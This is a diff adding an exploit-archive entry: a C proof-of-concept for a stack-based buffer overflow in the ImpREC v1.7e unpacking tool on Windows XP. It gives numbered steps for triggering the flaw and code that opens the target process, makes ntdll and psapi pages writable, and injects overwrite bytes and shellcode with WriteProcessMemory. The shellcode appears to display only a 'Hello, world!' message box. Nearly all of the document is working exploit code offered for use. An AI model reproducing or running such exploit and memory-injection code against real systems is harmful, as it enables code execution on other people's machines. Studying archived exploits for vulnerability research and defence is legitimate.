@@ -1,0 +1,120 @@
+id: 23450
+date: 03/28/2015
+title: ImpREC v1.7e Buffer Overflow Exploit
+author: Sergey Zelenyuk
+cves: 
+
+/*
+ * Q: what is it?
+ * A: stack-based buffer overflow vulnerability PoC exploit.
+ *
+ * Q: which program is vulnerable?
+ * A: ImpREC v1.7e
+ *
+ * Q: what prerequisites are?
+ * A: Windows XP SP3 x86, a bit of luck.
+ *
+ * Q: what should I do?
+ * A: 
+ * 1) compile imprec-exploit.c as imprec-exploit.exe; 
+ * 2) run ImpREC;
+ * 3) select ImpREC process in the list "Attach to an Active Process";
+ * 4) open a command line;
+ * 5) "imprec-exploit.exe <ImpREC PID>", see "[+] The memory has patched." if
+ *  all is ok;
+ * 6) close the command line;
+ * 7) set "RVA" field to 7C514001, "Size" to 00000010, click "Get Imports";
+ * 8) set "RVA" field to 7C514002, "Size" to 00000010, click "Get Imports";
+ * 9) set "RVA" field to 7C514003, "Size" to 00000010, click "Get Imports";
+ * 10) see the message box.
+ *
+ * Q: it does not work!
+ * A: there are several reasons:
+ * 1) psapi.dll did not loaded at 0x51400000. All Windows XP I have tested
+ *  loads the library at this address, but newer are not because of ASLR.
+ * 2) some libraries like msctfime.ime can execute an instructions at
+ *  0x7c914001 (ntdll) after 5'th step and it will cause an access violation
+ *  before you can proceed. The more clean Windows XP you use, the more 
+ *  chances you will not get this.
+*/
+
+#include <stdio.h>
+#include <windows.h>
+
+char destroyer[] =
+    "\x00\x00\x00\x00\x00\xaa\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+char shellcode[] =
+    "\x31\xc0\x68\x21\x00\x00\x00\x68\x6f\x72\x6c\x64\x68\x6f\x2c\x20"
+    "\x77\x68\x48\x65\x6c\x6c\x89\xe3\x50\x53\x53\x50\xff\x15\xb8\xd3"
+    "\x44\x00\x50\xff\x15\xa8\xd0\x44\x00";
+
+int main(int argc, char* argv[])
+{
+    HANDLE imprec;
+    int bytes_written;
+    int old_protect;
+
+    if (argc != 2) {
+        printf("Usage: %s <ImpREC PID>\n", argv[0]);
+        return 1;
+    }
+
+    imprec = OpenProcess(
+                PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
+                FALSE,
+                atoi(argv[1]));
+    if (!imprec) {
+        printf("[-] Cannot open ImpREC process.\n");
+        return 1;
+    }
+
+    if (!VirtualProtectEx(
+            imprec,
+            (void*) 0x7c914000,
+            0x1000,
+            PAGE_EXECUTE_READWRITE,
+            &old_protect)) {
+        printf("[-] Cannot set page protection of ntdll.dll memory.\n");
+        CloseHandle(imprec);
+        return 1;
+    }
+
+    if (!VirtualProtectEx(
+            imprec,
+            (void*) 0x51400000,
+            0x1000,
+            PAGE_EXECUTE_READWRITE,
+            &old_protect)) {
+        printf("[-] Cannot set page protection of psapi.dll memory.\n");
+        CloseHandle(imprec);
+        return 1;
+    }
+
+    if (!WriteProcessMemory(
+            imprec,
+            (void*) 0x7c914001,
+            destroyer,
+            16,
+            &bytes_written)) {
+        printf("[-] Cannot write the destroyer bytes to ntdll.dll memory.\n");
+        CloseHandle(imprec);
+        return 1;
+    }
+
+    if (!WriteProcessMemory(
+            imprec,
+            (void*) 0x5140097c,
+            shellcode,
+            41,
+            &bytes_written)) {
+        printf("[-] Cannot write the shellcode to psapi.dll memory.\n");
+        CloseHandle(imprec);
+        return 1;
+    }
+
+    printf("[+] The memory has patched.");
+    CloseHandle(imprec);
+    return 0;
+}
+
+#  0day.today [2023-03-21]  #
